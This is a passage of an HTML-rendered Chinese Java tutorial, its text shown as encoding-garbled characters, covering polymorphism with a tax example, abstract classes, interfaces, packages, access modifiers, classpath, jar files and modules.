class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ç»™ä¸€ä¸ªæœ‰æ™®é€šæ”¶å…¥ã€å·¥èµ„æ”¶å…¥å’Œäº«å—å›½åŠ¡é™¢ç‰¹æ®Šæ´¥è´´çš„å°ä¼™ä¼´ç®—ç¨:</span></span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> Income[] &#123;</span><br><span class="line">            <span class="keyword">new</span> Income(<span class="number">3000</span>),</span><br><span class="line">            <span class="keyword">new</span> Salary(<span class="number">7500</span>),</span><br><span class="line">            <span class="keyword">new</span> StateCouncilSpecialAllowance(<span class="number">15000</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">totalTax</span><span class="params">(Income... incomes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Income income: incomes) &#123;</span><br><span class="line">            total = total + income.getTax();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">double</span> income;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Income</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>; <span class="comment">// ç¨ç‡10%</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Salary</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Salary</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title">Income</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StateCouncilSpecialAllowance</span><span class="params">(<span class="keyword">double</span> income)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(income);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ğŸ‚ğŸº</p><ul><li>å­ç±»å¯ä»¥è¦†å†™çˆ¶ç±»çš„æ–¹æ³•ï¼ˆOverrideï¼‰ï¼Œè¦†å†™åœ¨å­ç±»ä¸­æ”¹å˜äº†çˆ¶ç±»æ–¹æ³•çš„è¡Œä¸ºï¼›</li><li>Javaçš„æ–¹æ³•è°ƒç”¨æ€»æ˜¯ä½œç”¨äºè¿è¡ŒæœŸå¯¹è±¡çš„å®é™…ç±»å‹ï¼Œè¿™ç§è¡Œä¸ºç§°ä¸ºå¤šæ€ï¼›</li><li><code>final</code>ä¿®é¥°ç¬¦æœ‰å¤šç§ä½œç”¨ï¼š<ul><li><code>final</code>ä¿®é¥°çš„æ–¹æ³•å¯ä»¥é˜»æ­¢è¢«è¦†å†™ï¼›</li><li><code>final</code>ä¿®é¥°çš„classå¯ä»¥é˜»æ­¢è¢«ç»§æ‰¿ï¼›</li><li><code>final</code>ä¿®é¥°çš„fieldå¿…é¡»åœ¨åˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–ï¼Œéšåä¸å¯ä¿®æ”¹ã€‚</li></ul></li></ul><h1 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h1><p>å¦‚æœçˆ¶ç±»çš„æ–¹æ³•æœ¬èº«ä¸éœ€è¦å®ç°ä»»ä½•åŠŸèƒ½ï¼Œä»…ä»…æ˜¯ä¸ºäº†å®šä¹‰æ–¹æ³•ç­¾åï¼Œç›®çš„æ˜¯è®©å­ç±»å»è¦†å†™å®ƒï¼Œé‚£ä¹ˆï¼Œå¯ä»¥æŠŠçˆ¶ç±»çš„æ–¹æ³•å£°æ˜ä¸ºæŠ½è±¡æ–¹æ³•ï¼š</p><p>é¢å‘æŠ½è±¡ç¼–ç¨‹çš„æœ¬è´¨å°±æ˜¯ï¼š</p><ul><li>ä¸Šå±‚ä»£ç åªå®šä¹‰è§„èŒƒï¼ˆä¾‹å¦‚ï¼š<code>abstract class Person</code>ï¼‰ï¼›</li><li>ä¸éœ€è¦å­ç±»å°±å¯ä»¥å®ç°ä¸šåŠ¡é€»è¾‘ï¼ˆæ­£å¸¸ç¼–è¯‘ï¼‰ï¼›</li><li>å…·ä½“çš„ä¸šåŠ¡é€»è¾‘ç”±ä¸åŒçš„å­ç±»å®ç°ï¼Œè°ƒç”¨è€…å¹¶ä¸å…³å¿ƒã€‚</li></ul><ul><li>é€šè¿‡<code>abstract</code>å®šä¹‰çš„æ–¹æ³•æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œå®ƒåªæœ‰å®šä¹‰ï¼Œæ²¡æœ‰å®ç°ã€‚æŠ½è±¡æ–¹æ³•å®šä¹‰äº†å­ç±»å¿…é¡»å®ç°çš„æ¥å£è§„èŒƒï¼›</li><li>å®šä¹‰äº†æŠ½è±¡æ–¹æ³•çš„classå¿…é¡»è¢«å®šä¹‰ä¸ºæŠ½è±¡ç±»ï¼Œä»æŠ½è±¡ç±»ç»§æ‰¿çš„å­ç±»å¿…é¡»å®ç°æŠ½è±¡æ–¹æ³•ï¼›</li><li>å¦‚æœä¸å®ç°æŠ½è±¡æ–¹æ³•ï¼Œåˆ™è¯¥å­ç±»ä»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼›</li><li>é¢å‘æŠ½è±¡ç¼–ç¨‹ä½¿å¾—è°ƒç”¨è€…åªå…³å¿ƒæŠ½è±¡æ–¹æ³•çš„å®šä¹‰ï¼Œä¸å…³å¿ƒå­ç±»çš„å…·ä½“å®ç°ã€‚</li></ul><h1 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h1><p>Javaçš„æ¥å£ç‰¹æŒ‡<code>interface</code>çš„å®šä¹‰ï¼Œè¡¨ç¤ºä¸€ä¸ªæ¥å£ç±»å‹å’Œä¸€ç»„æ–¹æ³•ç­¾åï¼Œè€Œç¼–ç¨‹æ¥å£æ³›æŒ‡æ¥å£è§„èŒƒï¼Œå¦‚æ–¹æ³•ç­¾åï¼Œæ•°æ®æ ¼å¼ï¼Œç½‘ç»œåè®®ç­‰ã€‚</p><p>æŠ½è±¡ç±»å’Œæ¥å£çš„å¯¹æ¯”å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="left"></th><th align="left">abstract class</th><th align="left">interface</th></tr></thead><tbody><tr><td align="left">ç»§æ‰¿</td><td align="left">åªèƒ½extendsä¸€ä¸ªclass</td><td align="left">å¯ä»¥implementså¤šä¸ªinterface</td></tr><tr><td align="left">å­—æ®µ</td><td align="left">å¯ä»¥å®šä¹‰å®ä¾‹å­—æ®µ</td><td align="left">ä¸èƒ½å®šä¹‰å®ä¾‹å­—æ®µ</td></tr><tr><td align="left">æŠ½è±¡æ–¹æ³•</td><td align="left">å¯ä»¥å®šä¹‰æŠ½è±¡æ–¹æ³•</td><td align="left">å¯ä»¥å®šä¹‰æŠ½è±¡æ–¹æ³•</td></tr><tr><td align="left">éæŠ½è±¡æ–¹æ³•</td><td align="left">å¯ä»¥å®šä¹‰éæŠ½è±¡æ–¹æ³•</td><td align="left">å¯ä»¥å®šä¹‰defaultæ–¹æ³•</td></tr></tbody></table><h2 id="æ¥å£ç»§æ‰¿"><a href="#æ¥å£ç»§æ‰¿" class="headerlink" title="æ¥å£ç»§æ‰¿"></a>æ¥å£ç»§æ‰¿</h2><p>ä¸€ä¸ª<code>interface</code>å¯ä»¥ç»§æ‰¿è‡ªå¦ä¸€ä¸ª<code>interface</code>ã€‚<code>interface</code>ç»§æ‰¿è‡ª<code>interface</code>ä½¿ç”¨<code>extends</code>ï¼Œå®ƒç›¸å½“äºæ‰©å±•äº†æ¥å£çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ<code>Person</code>æ¥å£ç»§æ‰¿è‡ª<code>Hello</code>æ¥å£ï¼Œå› æ­¤ï¼Œ<code>Person</code>æ¥å£ç°åœ¨å®é™…ä¸Šæœ‰3ä¸ªæŠ½è±¡æ–¹æ³•ç­¾åï¼Œå…¶ä¸­ä¸€ä¸ªæ¥è‡ªç»§æ‰¿çš„<code>Hello</code>æ¥å£ã€‚</p><p>Javaçš„æ¥å£ï¼ˆinterfaceï¼‰å®šä¹‰äº†çº¯æŠ½è±¡è§„èŒƒï¼Œä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼›</p><p>æ¥å£ä¹Ÿæ˜¯æ•°æ®ç±»å‹ï¼Œé€‚ç”¨äºå‘ä¸Šè½¬å‹å’Œå‘ä¸‹è½¬å‹ï¼›</p><p>æ¥å£çš„æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œæ¥å£ä¸èƒ½å®šä¹‰å®ä¾‹å­—æ®µï¼›</p><p>æ¥å£å¯ä»¥å®šä¹‰<code>default</code>æ–¹æ³•ï¼ˆJDK&gt;=1.8ï¼‰ã€‚</p><h1 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h1><p>Java ä¸­ï¼Œé€šè¿‡åŒ…æ¥è§£å†³åç§°å†²çªçš„é—®é¢˜ã€‚åœ¨Javaä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>package</code>æ¥è§£å†³åå­—å†²çªã€‚</p><p>åœ¨Javaè™šæ‹Ÿæœºæ‰§è¡Œçš„æ—¶å€™ï¼ŒJVMåªçœ‹å®Œæ•´ç±»åï¼Œå› æ­¤ï¼Œåªè¦åŒ…åä¸åŒï¼Œç±»å°±ä¸åŒã€‚</p><p>åŒ…å¯ä»¥æ˜¯å¤šå±‚ç»“æ„ï¼Œç”¨<code>.</code>éš”å¼€ã€‚ä¾‹å¦‚ï¼š<code>java.util</code>ã€‚</p><blockquote><p>è¦ç‰¹åˆ«æ³¨æ„ï¼šåŒ…æ²¡æœ‰çˆ¶å­å…³ç³»ã€‚java.utilå’Œjava.util.zipæ˜¯ä¸åŒçš„åŒ…ï¼Œä¸¤è€…æ²¡æœ‰ä»»ä½•ç»§æ‰¿å…³ç³»ã€‚</p></blockquote><p>æˆ‘ä»¬è¿˜éœ€è¦æŒ‰ç…§åŒ…ç»“æ„æŠŠä¸Šé¢çš„Javaæ–‡ä»¶ç»„ç»‡èµ·æ¥ã€‚å‡è®¾ä»¥<code>package_sample</code>ä½œä¸ºæ ¹ç›®å½•ï¼Œ<code>src</code>ä½œä¸ºæºç ç›®å½•ï¼Œé‚£ä¹ˆæ‰€æœ‰æ–‡ä»¶ç»“æ„å°±æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package_sample</span><br><span class="line">â””â”€ src</span><br><span class="line">    â”œâ”€ hong</span><br><span class="line">    â”‚  â””â”€ Person.java</span><br><span class="line">    â”‚  ming</span><br><span class="line">    â”‚  â””â”€ Person.java</span><br><span class="line">    â””â”€ mr</span><br><span class="line">       â””â”€ jun</span><br><span class="line">          â””â”€ Arrays.java</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åçš„<code>.class</code>æ–‡ä»¶ä¹Ÿéœ€è¦æŒ‰ç…§åŒ…ç»“æ„å­˜æ”¾ã€‚å¦‚æœä½¿ç”¨IDEï¼ŒæŠŠç¼–è¯‘åçš„<code>.class</code>æ–‡ä»¶æ”¾åˆ°<code>bin</code>ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆï¼Œç¼–è¯‘çš„æ–‡ä»¶ç»“æ„å°±æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package_sample</span><br><span class="line">â””â”€ bin</span><br><span class="line">   â”œâ”€ hong</span><br><span class="line">   â”‚  â””â”€ Person.class</span><br><span class="line">   â”‚  ming</span><br><span class="line">   â”‚  â””â”€ Person.class</span><br><span class="line">   â””â”€ mr</span><br><span class="line">      â””â”€ jun</span><br><span class="line">         â””â”€ Arrays.class</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘çš„å‘½ä»¤ç›¸å¯¹æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬éœ€è¦åœ¨<code>src</code>ç›®å½•ä¸‹æ‰§è¡Œ<code>javac</code>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d ..&#x2F;bin ming&#x2F;Person.java hong&#x2F;Person.java mr&#x2F;jun&#x2F;Arrays.java</span><br></pre></td></tr></table></figure><h1 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h1><p>åœ¨Javaä¸­ï¼Œæˆ‘ä»¬ç»å¸¸çœ‹åˆ°<code>public</code>ã€<code>protected</code>ã€<code>private</code>è¿™äº›ä¿®é¥°ç¬¦ã€‚åœ¨Javaä¸­ï¼Œè¿™äº›ä¿®é¥°ç¬¦å¯ä»¥ç”¨æ¥é™å®šè®¿é—®ä½œç”¨åŸŸã€‚</p><h2 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h2><p>åœ¨æ–¹æ³•å†…éƒ¨å®šä¹‰çš„å˜é‡ç§°ä¸ºå±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡ä½œç”¨åŸŸä»å˜é‡å£°æ˜å¤„å¼€å§‹åˆ°å¯¹åº”çš„å—ç»“æŸã€‚æ–¹æ³•å‚æ•°ä¹Ÿæ˜¯å±€éƒ¨å˜é‡ã€‚</p><p>å¦‚æœä¸ç¡®å®šæ˜¯å¦éœ€è¦<code>public</code>ï¼Œå°±ä¸å£°æ˜ä¸º<code>public</code>ï¼Œå³å°½å¯èƒ½å°‘åœ°æš´éœ²å¯¹å¤–çš„å­—æ®µå’Œæ–¹æ³•ã€‚</p><p>æŠŠæ–¹æ³•å®šä¹‰ä¸º<code>package</code>æƒé™æœ‰åŠ©äºæµ‹è¯•ï¼Œå› ä¸ºæµ‹è¯•ç±»å’Œè¢«æµ‹è¯•ç±»åªè¦ä½äºåŒä¸€ä¸ª<code>package</code>ï¼Œæµ‹è¯•ä»£ç å°±å¯ä»¥è®¿é—®è¢«æµ‹è¯•ç±»çš„<code>package</code>æƒé™æ–¹æ³•ã€‚</p><p>ä¸€ä¸ª<code>.java</code>æ–‡ä»¶åªèƒ½åŒ…å«ä¸€ä¸ª<code>public</code>ç±»ï¼Œä½†å¯ä»¥åŒ…å«å¤šä¸ªé<code>public</code>ç±»ã€‚å¦‚æœæœ‰<code>public</code>ç±»ï¼Œæ–‡ä»¶åå¿…é¡»å’Œ<code>public</code>ç±»çš„åå­—ç›¸åŒã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>Javaå†…å»ºçš„è®¿é—®æƒé™åŒ…æ‹¬<code>public</code>ã€<code>protected</code>ã€<code>private</code>å’Œ<code>package</code>æƒé™ï¼›</p><p>Javaåœ¨æ–¹æ³•å†…éƒ¨å®šä¹‰çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸä»å˜é‡å£°æ˜å¼€å§‹ï¼Œåˆ°ä¸€ä¸ªå—ç»“æŸï¼›</p><p><code>final</code>ä¿®é¥°ç¬¦ä¸æ˜¯è®¿é—®æƒé™ï¼Œå®ƒå¯ä»¥ä¿®é¥°<code>class</code>ã€<code>field</code>å’Œ<code>method</code>ï¼›</p><p>ä¸€ä¸ª<code>.java</code>æ–‡ä»¶åªèƒ½åŒ…å«ä¸€ä¸ª<code>public</code>ç±»ï¼Œä½†å¯ä»¥åŒ…å«å¤šä¸ªé<code>public</code>ç±»ã€‚</p><h1 id="classpath-jar"><a href="#classpath-jar" class="headerlink" title="classpath \ jar"></a>classpath \ jar</h1><h2 id="classpath"><a href="#classpath" class="headerlink" title="classpath"></a>classpath</h2><p><code>classpath</code>æ˜¯JVMç”¨åˆ°çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒç”¨æ¥æŒ‡ç¤ºJVMå¦‚ä½•æœç´¢<code>class</code>ã€‚</p><p>å› ä¸ºJavaæ˜¯ç¼–è¯‘å‹è¯­è¨€ï¼Œæºç æ–‡ä»¶æ˜¯<code>.java</code>ï¼Œè€Œç¼–è¯‘åçš„<code>.class</code>æ–‡ä»¶æ‰æ˜¯çœŸæ­£å¯ä»¥è¢«JVMæ‰§è¡Œçš„å­—èŠ‚ç ã€‚å› æ­¤ï¼ŒJVMéœ€è¦çŸ¥é“ï¼Œå¦‚æœè¦åŠ è½½ä¸€ä¸ª<code>abc.xyz.Hello</code>çš„ç±»ï¼Œåº”è¯¥å»å“ªæœç´¢å¯¹åº”çš„<code>Hello.class</code>æ–‡ä»¶ã€‚</p><p>æ‰€ä»¥ï¼Œ<code>classpath</code>å°±æ˜¯ä¸€ç»„ç›®å½•çš„é›†åˆï¼Œå®ƒè®¾ç½®çš„æœç´¢è·¯å¾„ä¸æ“ä½œç³»ç»Ÿç›¸å…³ã€‚ä¾‹å¦‚ï¼Œåœ¨Windowsç³»ç»Ÿä¸Šï¼Œç”¨<code>;</code>åˆ†éš”ï¼Œå¸¦ç©ºæ ¼çš„ç›®å½•ç”¨<code>&quot;&quot;</code>æ‹¬èµ·æ¥ï¼Œå¯èƒ½é•¿è¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\work\project1\bin;C:\shared;&quot;D:\My Documents\project1\bin&quot;</span><br></pre></td></tr></table></figure><p>åœ¨Linuxç³»ç»Ÿä¸Šï¼Œç”¨<code>:</code>åˆ†éš”ï¼Œå¯èƒ½é•¿è¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;shared:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;home&#x2F;liaoxuefeng&#x2F;bin</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å‡è®¾<code>classpath</code>æ˜¯<code>.;C:\work\project1\bin;C:\shared</code>ï¼Œå½“JVMåœ¨åŠ è½½<code>abc.xyz.Hello</code>è¿™ä¸ªç±»æ—¶ï¼Œä¼šä¾æ¬¡æŸ¥æ‰¾ï¼š</p><ul><li>&lt;å½“å‰ç›®å½•&gt;\abc\xyz\Hello.class</li><li>C:\work\project1\bin\abc\xyz\Hello.class</li><li>C:\shared\abc\xyz\Hello.class</li></ul><p>æ³¨æ„åˆ°<code>.</code>ä»£è¡¨å½“å‰ç›®å½•ã€‚å¦‚æœJVMåœ¨æŸä¸ªè·¯å¾„ä¸‹æ‰¾åˆ°äº†å¯¹åº”çš„<code>class</code>æ–‡ä»¶ï¼Œå°±ä¸å†å¾€åç»§ç»­æœç´¢ã€‚å¦‚æœæ‰€æœ‰è·¯å¾„ä¸‹éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±æŠ¥é”™ã€‚</p><p><code>classpath</code>çš„è®¾å®šæ–¹æ³•æœ‰ä¸¤ç§ï¼š</p><p>åœ¨ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­è®¾ç½®<code>classpath</code>ç¯å¢ƒå˜é‡ï¼Œä¸æ¨èï¼›</p><p>åœ¨å¯åŠ¨JVMæ—¶è®¾ç½®<code>classpath</code>å˜é‡ï¼Œæ¨èã€‚</p><p>æˆ‘ä»¬å¼ºçƒˆ<em>ä¸æ¨è</em>åœ¨ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­è®¾ç½®<code>classpath</code>ï¼Œé‚£æ ·ä¼šæ±¡æŸ“æ•´ä¸ªç³»ç»Ÿç¯å¢ƒã€‚åœ¨å¯åŠ¨JVMæ—¶è®¾ç½®<code>classpath</code>æ‰æ˜¯æ¨èçš„åšæ³•ã€‚å®é™…ä¸Šå°±æ˜¯ç»™<code>java</code>å‘½ä»¤ä¼ å…¥<code>-classpath</code>æˆ–<code>-cp</code>å‚æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -classpath .;C:\work\project1\bin;C:\shared abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨<code>-cp</code>çš„ç®€å†™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .;C:\work\project1\bin;C:\shared abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰è®¾ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œä¹Ÿæ²¡æœ‰ä¼ å…¥<code>-cp</code>å‚æ•°ï¼Œé‚£ä¹ˆJVMé»˜è®¤çš„<code>classpath</code>ä¸º<code>.</code>ï¼Œå³å½“å‰ç›®å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java abc.xyz.Hello</span><br></pre></td></tr></table></figure><h2 id="jaråŒ…"><a href="#jaråŒ…" class="headerlink" title="jaråŒ…"></a>jaråŒ…</h2><p>å¦‚æœæœ‰å¾ˆå¤š<code>.class</code>æ–‡ä»¶ï¼Œæ•£è½åœ¨å„å±‚ç›®å½•ä¸­ï¼Œè‚¯å®šä¸ä¾¿äºç®¡ç†ã€‚å¦‚æœèƒ½æŠŠç›®å½•æ‰“ä¸€ä¸ªåŒ…ï¼Œå˜æˆä¸€ä¸ªæ–‡ä»¶ï¼Œå°±æ–¹ä¾¿å¤šäº†ã€‚</p><p>jaråŒ…å°±æ˜¯ç”¨æ¥å¹²è¿™ä¸ªäº‹çš„ï¼Œå®ƒå¯ä»¥æŠŠ<code>package</code>ç»„ç»‡çš„ç›®å½•å±‚çº§ï¼Œä»¥åŠå„ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬<code>.class</code>æ–‡ä»¶å’Œå…¶ä»–æ–‡ä»¶ï¼‰éƒ½æ‰“æˆä¸€ä¸ªjaræ–‡ä»¶ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæ— è®ºæ˜¯å¤‡ä»½ï¼Œè¿˜æ˜¯å‘ç»™å®¢æˆ·ï¼Œå°±ç®€å•å¤šäº†ã€‚</p><p>jaråŒ…å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©æ–‡ä»¶ï¼Œè€ŒjaråŒ…ç›¸å½“äºç›®å½•ã€‚å¦‚æœæˆ‘ä»¬è¦æ‰§è¡Œä¸€ä¸ªjaråŒ…çš„<code>class</code>ï¼Œå°±å¯ä»¥æŠŠjaråŒ…æ”¾åˆ°<code>classpath</code>ä¸­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .&#x2F;hello.jar abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>è¿™æ ·JVMä¼šè‡ªåŠ¨åœ¨<code>hello.jar</code>æ–‡ä»¶é‡Œå»æœç´¢æŸä¸ªç±»ã€‚</p><p>jaråŒ…è¿˜å¯ä»¥åŒ…å«ä¸€ä¸ªç‰¹æ®Šçš„<code>/META-INF/MANIFEST.MF</code>æ–‡ä»¶ï¼Œ<code>MANIFEST.MF</code>æ˜¯çº¯æ–‡æœ¬ï¼Œå¯ä»¥æŒ‡å®š<code>Main-Class</code>å’Œå…¶å®ƒä¿¡æ¯ã€‚JVMä¼šè‡ªåŠ¨è¯»å–è¿™ä¸ª<code>MANIFEST.MF</code>æ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨<code>Main-Class</code>ï¼Œæˆ‘ä»¬å°±ä¸å¿…åœ¨å‘½ä»¤è¡ŒæŒ‡å®šå¯åŠ¨çš„ç±»åï¼Œè€Œæ˜¯ç”¨æ›´æ–¹ä¾¿çš„å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar hello.jar</span><br></pre></td></tr></table></figure><hr><p>å½“ç„¶ï¼Œè‚¯å®šç”¨ maven è¿™ä¸ªå‘½ä»¤æ¥æ‰“åŒ…jar åŒ…å•¦ã€‚</p><h1 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp app.jar:a.jar:b.jar:c.jar com.liaoxuefeng.sample.Main</span><br></pre></td></tr></table></figure><p>å¦‚æœæ¼å†™äº†æŸä¸ªè¿è¡Œæ—¶éœ€è¦ç”¨åˆ°çš„jarï¼Œé‚£ä¹ˆåœ¨è¿è¡ŒæœŸææœ‰å¯èƒ½æŠ›å‡º<code>ClassNotFoundException</code>ã€‚</p><p>æ‰€ä»¥ï¼Œjaråªæ˜¯ç”¨äºå­˜æ”¾classçš„å®¹å™¨ï¼Œå®ƒå¹¶ä¸å…³å¿ƒclassä¹‹é—´çš„ä¾èµ–ã€‚</p><p>ä»Java 